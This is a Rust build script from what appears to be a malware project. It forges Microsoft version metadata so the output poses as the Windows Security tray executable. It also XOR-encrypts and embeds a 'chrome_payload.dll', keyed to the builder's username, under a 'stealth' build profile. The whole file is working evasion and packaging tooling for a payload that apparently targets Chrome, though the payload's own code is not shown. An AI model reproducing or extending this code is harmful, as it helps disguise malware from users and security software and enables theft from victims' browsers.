use std::{env, fs, path::PathBuf};

fn main() {
    embed_version_resource();
    embed_payload();
}

fn embed_version_resource() {
    if env::var("CARGO_CFG_TARGET_OS").as_deref() != Ok("windows") {
        return;
    }

    let mut res = winres::WindowsResource::new();
    res.set("FileDescription", "Windows Security health systray executable");
    res.set("ProductName", "Microsoft\u{ae} Windows\u{ae} Operating System");
    res.set("CompanyName", "Microsoft Corporation");
    res.set("OriginalFilename", "SecurityHealthSystray.exe");
    res.set("InternalName", "SecurityHealthSystray");
    res.set(
        "LegalCopyright",
        "\u{c9} Microsoft Corporation. All rights reserved.",
    );
    res.set("FileVersion", "10.0.22621.1");
    res.set("ProductVersion", "10.0.22621.1");

    if let Err(err) = res.compile() {
        println!("cargo:warning=version resource skipped: {err}");
    }
}

fn embed_payload() {
    let manifest_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    let profile = env::var("PROFILE").unwrap_or_else(|_| "release".into());
    let target = env::var("TARGET").unwrap_or_default();
    let out = env::var("OUT_DIR")
        .map(PathBuf::from)
        .expect("OUT_DIR not set")
        .join("payload.dll");

    let candidates = [
        env::var("CHROME_PAYLOAD_DLL").ok().map(PathBuf::from),
        Some(manifest_dir.join(format!("target/{profile}/chrome_payload.dll"))),
        Some(
            manifest_dir
                .join(format!("target/{target}/{profile}/chrome_payload.dll")),
        ),
        Some(manifest_dir.join("target/release/chrome_payload.dll")),
        Some(
            manifest_dir.join(format!("target/{target}/release/chrome_payload.dll")),
        ),
        env::var("CARGO_TARGET_DIR")
            .ok()
            .map(|d| PathBuf::from(d).join(format!("{profile}/chrome_payload.dll"))),
        env::var("CARGO_TARGET_DIR").ok().map(|d| {
            PathBuf::from(d).join(format!("{target}/{profile}/chrome_payload.dll"))
        }),
    ];

    for src in candidates.into_iter().flatten() {
        if !src.exists() {
            continue;
        }
        let size = fs::metadata(&src).map(|m| m.len()).unwrap_or(0);
        if size == 0 {
            continue;
        }
        fs::copy(&src, &out).expect("copy payload.dll into OUT_DIR");
        let raw = fs::read(&out).expect("read payload.dll");
        let username = env::var("USERNAME").unwrap_or_default();
        let mut key = [0u8; 32];
        let bytes = username.as_bytes();
        if !bytes.is_empty() {
            for (i, slot) in key.iter_mut().enumerate() {
                *slot = bytes[i % bytes.len()];
            }
        }
        let encrypted: Vec<u8> = raw
            .iter()
            .enumerate()
            .map(|(i, b)| b ^ key[i % 32])
            .collect();
        fs::write(&out, encrypted).expect("xor-encrypt payload.dll into OUT_DIR");
        println!("cargo:rerun-if-changed={}", src.display());
        return;
    }

    panic!(
        "chrome_payload.dll not found or empty.\n\
         Run: cargo build --profile stealth -p chrome-payload\n\
         Then: cargo build --profile stealth -p jewish"
    );
}
